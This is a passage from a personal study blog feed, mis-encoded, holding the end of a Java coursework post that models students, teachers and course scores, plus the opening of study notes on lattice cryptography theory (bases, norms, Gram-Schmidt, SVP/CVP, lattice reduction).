class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> people;  <br><br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> course.Course;  <br><span class="hljs-keyword">import</span> course.Score;  <br><br><span class="hljs-comment">//å­¦ç”Ÿ  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;  <br>    <span class="hljs-keyword">private</span> HashMap&lt;Course, Score&gt; scores;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> id)</span> &#123;  <br>        <span class="hljs-built_in">super</span>(name, id);  <br>        <span class="hljs-built_in">this</span>.scores = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">enroll</span><span class="hljs-params">(Course course)</span> &#123;  <br>        scores.put(course, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Score</span>());  <br>        course.addStudent(<span class="hljs-built_in">this</span>);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setScore</span><span class="hljs-params">(Course course, <span class="hljs-type">double</span> score)</span> &#123;  <br>        <span class="hljs-keyword">if</span> (scores.containsKey(course)) &#123;  <br>            scores.get(course).setScore(score);  <br>        &#125;  <br>    &#125;  <br>    <span class="hljs-keyword">public</span> Score <span class="hljs-title function_">getScore</span><span class="hljs-params">(Course course)</span> &#123;  <br>        <span class="hljs-keyword">return</span> scores.get(course);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> HashMap&lt;Course, Score&gt; <span class="hljs-title function_">getScores</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> scores;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getTotalScore</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-type">double</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>        <span class="hljs-keyword">for</span> (Score score : scores.values()) &#123;  <br>            total += score.getScore();  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> total;  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getAverageScore</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">return</span> getTotalScore() / scores.size();  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>people&#x2F;Teacher:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> people;  <br><span class="hljs-keyword">import</span> java.util.ArrayList;  <br><span class="hljs-keyword">import</span> course.Course;  <br><br><span class="hljs-comment">//è€å¸ˆ  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Person</span> &#123;  <br>    <span class="hljs-keyword">private</span> ArrayList&lt;Course&gt; courses;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Teacher</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> id)</span> &#123;  <br>        <span class="hljs-built_in">super</span>(name, id);  <br>        <span class="hljs-built_in">this</span>.courses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">assignCourse</span><span class="hljs-params">(Course course)</span> &#123;  <br>        courses.add(course);  <br>    &#125;  <br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getTotalStudents</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>        <span class="hljs-keyword">for</span> (Course course : courses) &#123;  <br>            count += course.getStudents().size();  <br>        &#125;  <br>        <span class="hljs-keyword">return</span> count;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>app&#x2F;Main:</strong> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä¸»ç¨‹åº  </span><br><span class="hljs-keyword">package</span> app;  <br><span class="hljs-keyword">import</span> people.Student;  <br><span class="hljs-keyword">import</span> people.Teacher;  <br><span class="hljs-keyword">import</span> course.Course;  <br><span class="hljs-keyword">import</span> college.College;  <br><span class="hljs-keyword">import</span> college.Department;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">College</span> <span class="hljs-variable">college</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">College</span>(<span class="hljs-string">&quot;å›½å®¶ç½‘ç»œå®‰å…¨å­¦é™¢&quot;</span>);  <br>        <span class="hljs-type">Department</span> <span class="hljs-variable">Xinan</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Department</span>(<span class="hljs-string">&quot;ä¿¡æ¯å®‰å…¨ç³»&quot;</span>);  <br>        college.addDepartment(Xinan);  <br><br>        <span class="hljs-comment">// åˆ›å»ºæ•™å¸ˆ  </span><br>        <span class="hljs-type">Teacher</span> <span class="hljs-variable">teacher1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;å¼ è€å¸ˆ&quot;</span>, <span class="hljs-number">1001</span>);  <br>        <span class="hljs-type">Teacher</span> <span class="hljs-variable">teacher2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;ç‹è€å¸ˆ&quot;</span>,<span class="hljs-number">1002</span>);  <br>        Xinan.addTeacher(teacher1);  <br>        Xinan.addTeacher(teacher2);  <br><br>        <span class="hljs-comment">// åˆ›å»ºè¯¾ç¨‹  </span><br>        <span class="hljs-type">Course</span> <span class="hljs-variable">Course1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Course</span>(<span class="hljs-string">&quot;è®¡ç®—æœºç»„æˆåŸç†&quot;</span>);  <br>        <span class="hljs-type">Course</span> <span class="hljs-variable">Course2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Course</span>(<span class="hljs-string">&quot;Javaç½‘ç»œç¨‹åºè®¾è®¡&quot;</span>);  <br>        <span class="hljs-type">Course</span> <span class="hljs-variable">Course3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Course</span>(<span class="hljs-string">&quot;æ•°æ®ç»“æ„&quot;</span>);  <br>        Xinan.addCourse(Course1);  <br>        Xinan.addCourse(Course2);  <br>        Xinan.addCourse(Course3);  <br><br>        teacher1.assignCourse(Course1);  <br>        teacher2.assignCourse(Course2);  <br>        teacher1.assignCourse(Course3);  <br><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;å¼ ä¸‰&quot;</span>, <span class="hljs-number">2001</span>);  <br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;æå››&quot;</span>, <span class="hljs-number">2002</span>);  <br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;ç‹äº”&quot;</span>, <span class="hljs-number">2002</span>);  <br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">&quot;èµµå…­&quot;</span>, <span class="hljs-number">2002</span>);  <br><br>        Xinan.addStudent(student1);  <br>        Xinan.addStudent(student2);  <br>        Xinan.addStudent(student3);  <br>        Xinan.addStudent(student4);  <br><br>        student1.enroll(Course1);  <br>        student1.enroll(Course2);  <br>        student2.enroll(Course1);  <br>        student3.enroll(Course3);  <br>        student4.enroll(Course3);  <br><br>        student1.setScore(Course1, <span class="hljs-number">85</span>);  <br>        student1.setScore(Course2, <span class="hljs-number">99</span>);  <br>        student2.setScore(Course1, <span class="hljs-number">90</span>);  <br>        student3.setScore(Course3, <span class="hljs-number">88</span>);  <br>        student4.setScore(Course3, <span class="hljs-number">92</span>);  <br><br>        System.out.println(<span class="hljs-string">&quot;è®¡ç®—æœºç»„æˆåŸç†æ€»åˆ†: &quot;</span> + Course1.getTotalScore());  <br>        System.out.println(<span class="hljs-string">&quot;è®¡ç®—æœºç»„æˆåŸç†å¹³å‡åˆ†: &quot;</span> + Course1.getAverageScore());  <br><br>        System.out.println(student1.getName() + <span class="hljs-string">&quot; æ€»åˆ†: &quot;</span> + student1.getTotalScore());  <br>        System.out.println(student1.getName() + <span class="hljs-string">&quot; å¹³å‡åˆ†: &quot;</span> + student1.getAverageScore());  <br><br>        System.out.println(teacher1.getName() + <span class="hljs-string">&quot; æ•™æˆçš„å­¦ç”Ÿæ€»æ•°: &quot;</span> + teacher1.getTotalStudents());  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è¿è¡Œç»“æœï¼š</strong><br><img src="/2025/04/02/Java%E7%BD%91%E7%BB%9C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-04-03%20212024.png"></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ¼å¯†ç ä¸“é¢˜å­¦ä¹ </title>
    <link href="/2025/04/02/%E6%A0%BC%E5%AF%86%E7%A0%81%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/04/02/%E6%A0%BC%E5%AF%86%E7%A0%81%E4%B8%93%E9%A2%98%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ¼å¯†ç ä¸“é¢˜å­¦ä¹ "><a href="#æ ¼å¯†ç ä¸“é¢˜å­¦ä¹ " class="headerlink" title="æ ¼å¯†ç ä¸“é¢˜å­¦ä¹ "></a>æ ¼å¯†ç ä¸“é¢˜å­¦ä¹ </h1><p>æœ€è¿‘å‘ç°æ¯æ¬¡åšæ ¼çš„é¢˜éƒ½ä¸€çŸ¥åŠè§£æ ¼ä¸å‡ºæ¥ï¼Œå› æ­¤å†³å®šä»é›¶å¼€å§‹ç³»ç»Ÿå­¦ä¹ ä¸€ä¸‹æ ¼ã€‚</p><h2 id="ä¸€ã€å®šä¹‰"><a href="#ä¸€ã€å®šä¹‰" class="headerlink" title="ä¸€ã€å®šä¹‰"></a>ä¸€ã€å®šä¹‰</h2><ul><li><p><strong>åŸºï¼š</strong> åœ¨nç»´ç©ºé—´ä¸­ç»™å®šçš„nä¸ªçº¿æ€§æ— å…³å‘é‡ï¼š$\vec{b_1},\vec{b_2},â€¦,\vec{b_n}$ã€‚</p></li><li><p><strong>æ ¼ï¼š</strong> å¯¹äºnç»´ç©ºé—´ä¸­çš„åŸºï¼Œå­˜åœ¨çº¿æ€§ç»„åˆ$x_1\vec{b_1}+x_2\vec{b_2}+â€¦+x_n\vec{b_n}$,å…¶ä¸­æ•´ç³»æ•°çš„çº¿æ€§ç»„åˆæ„æˆçš„é›†åˆæˆä¸ºæ ¼ï¼Œå³$x_i\in \mathbb{Z}$ï¼Œè®°ä¸º</p></li></ul><span>$$  \mathcal{L}(B)=\{x_1\vec{b_1}+x_2\vec{b_2}+...+x_n\vec{b_n},x_i\in\mathbb{Z}\}$$</span>  <p>  <strong>ä¸åŒçš„åŸºå¯èƒ½äº§ç”ŸåŒæ ·çš„æ ¼</strong></p><h2 id="äºŒã€ç†è®ºçŸ¥è¯†ç‚¹"><a href="#äºŒã€ç†è®ºçŸ¥è¯†ç‚¹" class="headerlink" title="äºŒã€ç†è®ºçŸ¥è¯†ç‚¹"></a>äºŒã€ç†è®ºçŸ¥è¯†ç‚¹</h2><h3 id="æ ¼çš„ç­‰ä»·äº¤æ¢"><a href="#æ ¼çš„ç­‰ä»·äº¤æ¢" class="headerlink" title="æ ¼çš„ç­‰ä»·äº¤æ¢"></a>æ ¼çš„ç­‰ä»·äº¤æ¢</h3><ul><li><p><strong>å‘é‡äº¤æ¢ï¼š</strong> å³$\vec{b_i}\longleftrightarrow\vec{b_j}$</p></li><li><p><strong>å‘é‡å–åï¼š</strong> å³$\vec{b_i}\longleftrightarrow-\vec{b_i}$</p></li><li><p><strong>æ•´ç³»æ•°çº¿æ€§ç»„åˆï¼š</strong> å³$\vec{b_i}\longleftrightarrow\vec{b_i}+k\vec{b_j}$ </p><blockquote><p><strong>ä¸åŒæ ¼åŸºäº§ç”Ÿç›¸åŒæ ¼çš„æ¡ä»¶ï¼š</strong> ä¸¤ä¸ªæ ¼åŸºçŸ©é˜µ$B_1,B_2$ ,è‹¥$B_2&#x3D;B_1U$ï¼Œï¼ˆUæ˜¯å¹ºæ¨¡çŸ©é˜µï¼Œå³è¡Œåˆ—å¼çš„å€¼ä¸ºÂ±1çš„çŸ©é˜µï¼‰ï¼Œåˆ™ä¸¤ç»„æ ¼åŸºäº§ç”Ÿçš„æ ¼ç›¸åŒã€‚</p></blockquote></li></ul><h3 id="æ ¼çš„åŸºæœ¬åŒºåŸŸ"><a href="#æ ¼çš„åŸºæœ¬åŒºåŸŸ" class="headerlink" title="æ ¼çš„åŸºæœ¬åŒºåŸŸ"></a>æ ¼çš„åŸºæœ¬åŒºåŸŸ</h3><ul><li><strong>å®šä¹‰ï¼š</strong> æ ¼åŸºç»„æˆçš„æœ€å°é‡å¤å•å…ƒã€‚</li></ul><h3 id="è¡Œåˆ—å¼"><a href="#è¡Œåˆ—å¼" class="headerlink" title="è¡Œåˆ—å¼"></a>è¡Œåˆ—å¼</h3><ul><li><p>å†æ¬¡è®¤è¯†<strong>ä¸åŒæ ¼åŸºäº§ç”Ÿç›¸åŒæ ¼çš„æ¡ä»¶ï¼š</strong> è¡Œåˆ—å¼çš„å€¼ç›¸åŒã€‚</p></li><li><p><strong>è¡Œåˆ—å¼è¶Šå°ï¼Œæ ¼ç‚¹å¯†åº¦è¶Šå¤§ã€‚</strong></p></li></ul><h3 id="å»¶å±•ç©ºé—´"><a href="#å»¶å±•ç©ºé—´" class="headerlink" title="å»¶å±•ç©ºé—´"></a>å»¶å±•ç©ºé—´</h3><ul><li><p><strong>å®šä¹‰ï¼š</strong> æ ¼$\mathcal{L}(B)$ä¸­åŸºçš„æ‰€æœ‰<strong>çº¿æ€§ç»„åˆ</strong>æ‰€å½¢æˆçš„<strong>é›†åˆ</strong>ä¸ºè¿™ç»„åŸºå‘é‡æ‰€å¼ æˆçš„å»¶å±•ç©ºé—´ã€‚</p><p>å³$span(\mathcal{L}(B))&#x3D;span(B)&#x3D;{a_1\vec{b_1}+a_2\vec{b_2}+â€¦+a_n\vec{b_n}|a_i\in\mathbb{R}}$</p></li></ul><h3 id="èŒƒæ•°"><a href="#èŒƒæ•°" class="headerlink" title="èŒƒæ•°"></a>èŒƒæ•°</h3><ul><li><strong>$l_1$èŒƒæ•°ï¼š</strong></li></ul><span>$\|x\|_1=\sum^n_{i=1}|x_i|$</span><ul><li>$l_2$<strong>èŒƒæ•°ï¼š</strong></li></ul><span> $\|x\|_2=\sqrt{ \sum^n_{i=1}x_i^2}$ï¼ˆæ¬§å‡ é‡Œå¾—èŒƒæ•°ï¼‰</span><ul><li>$l_{\infty}$<strong>èŒƒæ•°ï¼š</strong><br>$|x|_{\infty}&#x3D;max|x_i|$</li></ul><h3 id="Successive-Minimaï¼ˆè¿ç»­æå°ï¼‰"><a href="#Successive-Minimaï¼ˆè¿ç»­æå°ï¼‰" class="headerlink" title="Successive Minimaï¼ˆè¿ç»­æå°ï¼‰"></a>Successive Minimaï¼ˆè¿ç»­æå°ï¼‰</h3><ul><li><strong>å®šä¹‰ï¼š</strong> åœ¨$ç§©ä¸ºnçš„æ ¼\mathcal{L}ä¸­ï¼Œç¬¬iä¸ªè¿ç»­æå°å€¼ï¼ˆi&#x3D;1,2,â€¦,nï¼‰ï¼Œ$</li></ul><span>$$  \lambda_i=inf\{r|dim(span(\mathcal{L}\cap\mathcal{B}(0,r)))\ge i\}$$</span>  <p>  å…¶ä¸­$\lambda_1$æ˜¯æœ€çŸ­éé›¶å‘é‡ã€‚$inf$æŒ‡ä¸‹ç•Œã€‚$\mathcal{B}(0,r)$æ˜¯åœ¨é›¶ç‚¹ï¼ŒåŠå¾„ä¸º$r$çš„è¶…çƒä½“ã€‚</p><ul><li><strong>é‡ç‚¹ï¼š</strong> $\lambda _1$æ˜¯æ ¼$\mathcal{L}$ä¸­çš„æœ€çŸ­éé›¶å‘é‡çš„é•¿åº¦</li></ul><h3 id="æ–½å¯†ç‰¹æ­£äº¤åŒ–"><a href="#æ–½å¯†ç‰¹æ­£äº¤åŒ–" class="headerlink" title="æ–½å¯†ç‰¹æ­£äº¤åŒ–"></a>æ–½å¯†ç‰¹æ­£äº¤åŒ–</h3><p><strong>æ­£äº¤åŒ–è¿‡ç¨‹ï¼š</strong></p><ul><li><p>ç»™å®šä¸€ç»„<strong>çº¿æ€§æ— å…³å‘é‡</strong>$b_1,b_2,â€¦,b_n$</p></li><li><p>ç›®æ ‡è®¡ç®—å¾—åˆ°ä¸€ç»„æ­£äº¤åŸº$\tilde b_1,\tilde b_2,â€¦,\tilde b_n$</p></li><li><p>$&lt;b_i,b_j&gt;$è¡¨ç¤º$b_i$å’Œ$b_j$çš„å†…ç§¯</p></li><li><p>ä»¤$\mu_{i,j}&#x3D;\frac{&lt;b_i,b_j&gt;}{&lt;b_j,b_j&gt;}$</p></li><li><p>æ­£äº¤åŒ–åçš„å‘é‡è¡¨ç¤ºä¸º</p></li></ul><span>$$\begin{cases}\tilde b_1=b_1 \\\tilde b_2=\mu_{2,1}\tilde b_1 \\\vdots \\\tilde b_i=\sum^{i-1}_{j=1}\mu_{i,j}\tilde b_{j}\end{cases}$$</span><blockquote><p><strong>æ³¨æ„ï¼š</strong> æ–½å¯†ç‰¹æ­£äº¤åŒ–æ²¡æœ‰é™åˆ¶ç³»æ•°ä¸ºæ•´æ•°ï¼Œå› æ­¤æ­£äº¤åŒ–çš„ç»“æœä¸èƒ½ç›´æ¥åº”ç”¨äºæ ¼åŸºã€‚</p></blockquote><h3 id="QRåˆ†è§£"><a href="#QRåˆ†è§£" class="headerlink" title="QRåˆ†è§£"></a>QRåˆ†è§£</h3><ul><li><p><strong>å®šä¹‰ï¼š</strong> å°†ä¸€ä¸ªçŸ©é˜µåˆ†è§£ä¸ºä¸€ä¸ª<strong>æ­£äº¤çŸ©é˜µQ</strong>å’Œä¸€ä¸ªä¸Š<strong>ä¸‰è§’çŸ©é˜µR</strong>çš„ä¹˜ç§¯ï¼Œå³ <strong>A&#x3D;QR</strong>ã€‚</p></li><li><p><strong>å¼•å…¥ï¼š</strong> å¯¹æ–½å¯†ç‰¹æ­£äº¤åŒ–ä¹‹åçš„å‘é‡è¿›è¡Œå–æ•´ï¼Œå¾—åˆ°è¿‘ä¼¼æ­£äº¤åŸº$\tilde b_1,\tilde b_2,â€¦,\tilde b_n$</p></li><li><p><strong>çŸ©é˜µ</strong>å½¢å¼è¡¨ç¤ºï¼š</p></li></ul><span>  $$  \begin{bmatrix}\|\tilde b_1\| & \mu_{2,1}\|\tilde b_1 \| & \cdots & \mu_{n,1}\|\tilde b_1\| \\0 & \|\tilde b_2\| & \cdots & \mu_{n,2}\| b_2\| \\\vdots & \vdots & \ddots & \vdots \\0 & 0 & \cdots & \|\tilde b_n\|\end{bmatrix}  $$  </span><ul><li><p><strong>ç»“è®ºï¼š</strong></p><ul><li><p>$det(B)&#x3D;\Pi^n_{i&#x3D;1}|\tilde b_i|$</p></li><li><p>å¯ä»¥å¾—åˆ°$\lambda_1$çš„ä¸‹ç•Œï¼Œå³$\lambda_1 \ge min(|\tilde b_i)|$</p></li></ul></li><li><p>ä¸æ‡‚ï¼Œç•™å‘</p></li></ul><h3 id="Hermiteå®šç†ï¼ˆèµ«ç±³ç‰¹å®šç†ï¼‰"><a href="#Hermiteå®šç†ï¼ˆèµ«ç±³ç‰¹å®šç†ï¼‰" class="headerlink" title="Hermiteå®šç†ï¼ˆèµ«ç±³ç‰¹å®šç†ï¼‰"></a>Hermiteå®šç†ï¼ˆèµ«ç±³ç‰¹å®šç†ï¼‰</h3><ul><li><p><strong>ç›®çš„ï¼š</strong> æ±‚$\lambda_1$çš„ä¸Šç•Œ</p></li><li><p><strong>å†…å®¹ï¼š</strong> å¯¹äº$n$ç»´æ ¼$\mathcal{L}$ï¼Œéƒ½æœ‰ä¸€ä¸ªéé›¶å‘é‡$\vec{v}\in \mathcal{L}$ï¼Œæ»¡è¶³$|\vec{v}|\le\sqrt{n}det(\mathcal{L})^{\frac{1}{n}}$</p></li></ul><h3 id="é«˜æ–¯å¯å‘å¼"><a href="#é«˜æ–¯å¯å‘å¼" class="headerlink" title="é«˜æ–¯å¯å‘å¼"></a>é«˜æ–¯å¯å‘å¼</h3><ul><li><p><strong>å¼•å…¥ï¼š</strong> å¯¹<strong>Hermiteå®šç†</strong>çš„è¿›ä¸€æ­¥ç¼©å°ã€‚</p></li><li><p><strong>å†…å®¹ï¼š</strong> å¯¹äº$n$ç»´æ ¼$\mathcal{L}$ï¼Œé«˜æ–¯æœŸæœ›çš„é•¿åº¦ä¸º</p></li></ul><span>$$  \sigma(\mathcal{L})=\sqrt{\frac{n}{2\pi e}}det(\mathcal{L})^{\frac{1}{n}}$$</span><ul><li><strong>ç»“è®ºï¼š</strong> åœ¨â€éšæœºé€‰æ‹©çš„æ ¼â€œä¸­æœ€çŸ­å‘é‡æ»¡è¶³$|\vec{v}|\approx\sigma(\mathcal{L})$</li></ul><h2 id="ä¸‰ã€ä¸‰å¤§é—®é¢˜"><a href="#ä¸‰ã€ä¸‰å¤§é—®é¢˜" class="headerlink" title="ä¸‰ã€ä¸‰å¤§é—®é¢˜"></a>ä¸‰ã€ä¸‰å¤§é—®é¢˜</h2><h3 id="SVPé—®é¢˜ï¼ˆæœ€çŸ­å‘é‡é—®é¢˜ï¼‰"><a href="#SVPé—®é¢˜ï¼ˆæœ€çŸ­å‘é‡é—®é¢˜ï¼‰" class="headerlink" title="SVPé—®é¢˜ï¼ˆæœ€çŸ­å‘é‡é—®é¢˜ï¼‰"></a>SVPé—®é¢˜ï¼ˆæœ€çŸ­å‘é‡é—®é¢˜ï¼‰</h3><ul><li>å¯»æ‰¾ä¸€ä¸ªéšæœºæ ¼$L$ä¸­çš„æœ€çŸ­éé›¶å‘é‡ï¼Œå³å¯»æ‰¾ä¸€ä¸ª$v\in L$æ»¡è¶³$|v|$æœ€å°ã€‚</li></ul><h3 id="CVPé—®é¢˜ï¼ˆæœ€è¿‘å‘é‡é—®é¢˜ï¼‰"><a href="#CVPé—®é¢˜ï¼ˆæœ€è¿‘å‘é‡é—®é¢˜ï¼‰" class="headerlink" title="CVPé—®é¢˜ï¼ˆæœ€è¿‘å‘é‡é—®é¢˜ï¼‰"></a>CVPé—®é¢˜ï¼ˆæœ€è¿‘å‘é‡é—®é¢˜ï¼‰</h3><ul><li>åœ¨æ ¼$L$ä¸­ï¼Œå·²çŸ¥ä¸€ä¸ªä¸åœ¨æ ¼ç‚¹ä¸Šçš„å‘é‡$w$ï¼Œå¯»æ‰¾ä¸€ä¸ªå‘é‡$v\in L$ï¼Œä½¿å¾—$|w-v|$æœ€å°ã€‚</li></ul><h3 id="SIVPé—®é¢˜ï¼ˆæœ€çŸ­ç‹¬ç«‹å‘é‡é—®é¢˜ï¼‰"><a href="#SIVPé—®é¢˜ï¼ˆæœ€çŸ­ç‹¬ç«‹å‘é‡é—®é¢˜ï¼‰" class="headerlink" title="SIVPé—®é¢˜ï¼ˆæœ€çŸ­ç‹¬ç«‹å‘é‡é—®é¢˜ï¼‰"></a>SIVPé—®é¢˜ï¼ˆæœ€çŸ­ç‹¬ç«‹å‘é‡é—®é¢˜ï¼‰</h3><ul><li>åœ¨æ ¼$L$ä¸­ï¼Œå¯»æ‰¾$n$ä¸ªçº¿æ€§ç‹¬ç«‹çš„å‘é‡$Bx_1,Bx_2,â€¦,Bx_n$ï¼Œå¹¶ä¸”è¿™äº›å‘é‡çš„é•¿åº¦éƒ½å°äºç­‰äºæœ€é•¿çš„æœ€çŸ­å‘é‡$\lambda_n$</li></ul><span>$$  max\|Bx_i\| \le \lambda_n$$</span><h2 id="å››ã€æ ¼æ”»å‡»åº”ç”¨"><a href="#å››ã€æ ¼æ”»å‡»åº”ç”¨" class="headerlink" title="å››ã€æ ¼æ”»å‡»åº”ç”¨"></a>å››ã€æ ¼æ”»å‡»åº”ç”¨</h2><h3 id="æ ¼åŸºè§„çº¦ç®—æ³•ï¼ˆLLL-BKZï¼‰"><a href="#æ ¼åŸºè§„çº¦ç®—æ³•ï¼ˆLLL-BKZï¼‰" class="headerlink" title="æ ¼åŸºè§„çº¦ç®—æ³•ï¼ˆLLL,BKZï¼‰"></a>æ ¼åŸºè§„çº¦ç®—æ³•ï¼ˆLLL,BKZï¼‰</h3><h4 id="é«˜æ–¯ç®—æ³•"><a href="#é«˜æ–¯ç®—æ³•" class="headerlink" title="é«˜æ–¯ç®—æ³•"></a>é«˜æ–¯ç®—æ³•</h4><ul><li><p><strong>ç®€ä»‹ï¼š</strong> ä¸€ç§åŸå§‹çš„<strong>äºŒç»´</strong>æ ¼åŸºè§„çº¦ç®—æ³•ã€‚</p></li><li><p><strong>æ¦‚å¿µ</strong></p><ul><li><p><strong>æœ€å°åŸºï¼š</strong> è®¾$x,y$æ˜¯<strong>äºŒç»´æ ¼</strong>$L$ä¸­çš„ä¸€ç»„åŸºã€‚è‹¥$x,y$æ»¡è¶³$|x|&#x3D;\lambda_1$(åæ–‡å‡ç”¨$|x|$è¡¨ç¤ºå‘é‡é•¿åº¦)ï¼Œä¸”$y$ ä¸$x$çº¿æ€§æ— å…³ï¼Œåˆ™$x,y$ä¸º<strong>æœ€å°åŸº</strong>ï¼ˆä¹Ÿç§°<strong>Minkowskiçº¦åŒ–åŸº</strong>ï¼‰ ã€‚</p></li><li><p><strong>å–æ•´ï¼š</strong> 